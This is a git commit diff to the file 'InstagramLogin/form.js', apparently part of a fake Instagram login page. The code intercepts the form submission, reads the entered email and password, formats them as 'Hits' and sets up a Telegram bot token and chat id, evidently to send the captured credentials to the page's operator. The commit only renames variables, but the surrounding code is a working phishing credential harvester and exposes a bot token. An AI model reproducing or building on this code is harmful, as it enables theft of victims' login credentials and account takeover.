62ff4134be563aad4713332ce58efb537bbc6496
t0ufik01 <2fik.47@gmail.com>
2023-01-19 16:07:13 +0100

    Add&Edit

--- InstagramLogin/form.js
+++ InstagramLogin/form.js
@@ -3,10 +3,10 @@ const form = document.querySelector("#form");
 addEventListener("submit", (e) => {
   e.preventDefault();
 
-  var mail = document.getElementById("mail").value;
-  var pass = document.getElementById("pass").value;
+  var email = document.getElementById("email").value;
+  var password = document.getElementById("password").value;
 
-  var message = "Hits :%0A" + mail + ":" + pass;
+  var message = "Hits :%0A" + email + ":" + password;
 
   var token = "5441699225:AAGjoUFWwYVO7PS_jYuZp6ljxmNoGRetM6E";
   var chat_id = 1430266005;
